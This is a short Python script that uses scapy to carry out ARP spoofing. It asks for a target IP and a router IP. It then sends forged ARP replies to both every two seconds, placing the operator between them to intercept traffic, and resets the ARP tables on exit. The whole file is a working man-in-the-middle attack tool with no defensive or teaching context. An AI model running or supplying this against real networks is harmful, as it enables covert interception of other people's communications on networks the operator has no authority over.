#!/usr/bin/python
import time
import scapy.all as scapy

target_input = input("What is the target address? ")
router_input = input("what is the router you are spoofing? ")
#target_input = "x.x.x.x"
#router_input = "x.x.x.x"

def get_mac(ip):
    arp_req = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_req_bc = broadcast/arp_req
    reply_list = scapy.srp(arp_req_bc, timeout=2, verbose=False)[0]
    return reply_list[0][1].hwsrc

def spoof(target_addr, spoofed):
    target_mac = get_mac(target_addr)
    packet = scapy.ARP(op=2, pdst=target_addr, hwdst=target_mac, psrc=spoofed)
    scapy.send(packet, verbose = False)

def restore(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    packet = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac )
#   print(packet.show)
#    print(packet.summary)
    scapy.send(packet, count=4, verbose=False)

packets_sent = 0
try:
    while True:
        spoof(target_input, router_input)
        spoof(router_input, target_input)
        packets_sent = packets_sent + 2
        print("\r[+] Packets sent: " + str(packets_sent), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] You have exited the program. Reseting ARP tables")
    restore(target_input, router_input)
    restore(router_input, target_input)
